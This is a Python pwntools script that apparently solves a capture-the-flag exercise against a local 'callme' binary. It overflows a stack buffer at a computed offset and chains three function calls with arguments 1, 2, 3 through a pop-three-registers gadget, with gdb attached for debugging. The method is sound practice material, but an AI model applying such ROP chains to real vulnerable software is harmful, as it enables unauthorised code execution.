from pwn import *

t = process("./callme")

gdb_cmd = ["b *0x00000000004019fe", "c"]  # "b *0x080487a6"

context.terminal = ["gnome-terminal", "-e"]
gdb.attach(t, gdbscript='\n'.join(gdb_cmd))

callme_one_address = 0x401850
callme_two_address = 0x401870
callme_three_address = 0x401810
pop3ret = 0x401ab0

# rop = cyclic(80, n=4)
offset = cyclic_find("kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa", n=4)
print(offset)

rop = "A"*offset
rop += p64(pop3ret)
rop += p64(1)
rop += p64(2)
rop += p64(3)
rop += p64(callme_one_address)

rop += p64(pop3ret)
rop += p64(1)
rop += p64(2)
rop += p64(3)
rop += p64(callme_two_address)

rop += p64(pop3ret)
rop += p64(1)
rop += p64(2)
rop += p64(3)
rop += p64(callme_three_address)

t.recvuntil('\n>')
t.sendline(rop)

t.interactive()
